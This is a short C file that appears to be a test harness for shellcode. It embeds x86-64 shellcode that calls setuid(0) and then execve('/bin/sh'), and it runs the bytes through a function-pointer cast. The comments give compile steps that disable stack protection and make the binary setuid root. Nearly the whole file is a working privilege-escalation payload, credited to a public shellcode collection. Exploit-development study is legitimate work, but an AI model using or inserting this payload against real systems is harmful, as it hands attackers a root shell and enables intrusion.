// modified shellcode to add to rsp and call setuid(0); execve("/bin/sh");
// original reference: http://shell-storm.org/shellcode/files/shellcode-77.php

// compile and test with:
// gcc test_shellcode1.c -z execstack -o test_shellcode2
// sudo chown root test_shellcode2
// sudo chmod 4755 test_shellcode2
// ./test_shellcode2

#include <stdio.h>
#include <string.h>

char shellcode[] = "\x48\x83\xc4\x40\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";

int main() {
    printf("len:%ld bytes\n", strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}
